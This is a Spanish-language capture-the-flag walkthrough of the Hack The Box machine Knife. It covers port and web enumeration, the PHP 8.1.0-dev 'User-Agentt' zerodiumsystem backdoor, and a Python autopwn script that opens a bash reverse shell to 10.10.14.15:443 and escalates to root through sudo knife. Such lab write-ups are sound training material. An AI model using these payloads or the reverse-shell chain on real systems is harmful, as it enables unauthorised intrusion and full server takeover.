---
layout: post
title: HTB_Knife
date: 2023/07/10
slug: HTB_Knife
heroImage: /assets/machines.jpg
---

# Knife {-}

## Introduccion {-}

La maquina del dia se llama Knife.

El replay del live se puede ver aqui

[![S4vitaar Knife maquina](https://img.youtube.com/vi/Um6-iIYzUWk/0.jpg)](https://www.youtube.com/watch?v=Um6-iIYzUWk)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.242
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.242
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.242 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.242 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | tcp      | Conneccion directa | creds      |
| 80     | tcp      | Web, Fuzzing       |            |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.242
```

Es un Apache 2.4.41 en un Ubuntu Con una version 8.1.0-dev de PHP. 


#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.242 
```
, No vemos gran cosas tenemos que aplicar Fuzzing.

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.242/FUZZ
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,txt-php http://10.10.10.242/FUZZ.FUZ2Z
```

Tampoco encontramos gran cosa por aqui.

#### Analyzamos las cabezeras de la respuesta al lado del servidor {-}

```bash
curl -s -X GET http://10.10.10.242 -I
```

No vemos nada. Miramos por la version de php que parece un poco rara.


## Vulnerability Assessment {-}


### php 4.1.0-dev {-}

Si buscamos en google pro 
```bash
 PHP 8.1.0 exploit 
```
 vemos una pagina que habla de User-Agent Remote Code Execution.

La vulnerabilidad aqui reside en poner un User-Agentt con 2 T con un zerodiumsystem command.

```bash
"User-Agent": "Mozilla/5...."
"User-Agentt": "zerodiumsystem('" + COMMANDO + "');"
```

Lo intentamos

```bash
curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('whoami');"
#Output 
james
...

curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('id');" head -n 1
```
## Vuln exploit & Gaining Access {-}

### Ganando accesso con un Autopwn en Pyton {-}

```python
#!/usr/bin/python3

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.242/"
lport = 443

def makeRequest():

    headers = {
        'User-Agentt': 'zerodiumsystem("bash -c \'bash -i >& /dev/tcp/10.10.14.15/443 0>&1\'");'
    }

    r = requests.get(main_url, headers=headers)

if __name__ == '__main__':

    p1 = log.progress("Pwn Web")
    p1.status("Explotando vulnerabilidad PHP 8.1.0-dev - User Agentt Remote Code Execution")

    time.sleep(2)

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        p1.failure("No ha sido posible comprometer el sistema")
        sys.exit(1)
    else:
        p1.success("Comando inyectado exitosamente")
        shell.sendline("sudo knife exec -E 'exec \"/bin/sh\"'")
        shell.interactive()
```

Lo lanzamos con el commando 
```bash
 python3 autopwn.py 
```


```bash
whoami
#Output
james

hostname -I
#Output
10.10.10.242
```

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
```

Podemos ejecutar el commando 
```bash
 /usr/bin/knife 
```
 como el usuario root sin proporcionar contraseña.

buscando por [gtfobins](https://gtfobins.github.io/gtfobins/knife/#sudo), vemos que podemos usar este
commando para ejecutar una shell.

```bash
sudo knife exec -E 'exec "/bin/bash"'
whoami
#Output 
root
```

Ya podemos leer la flag root.txt
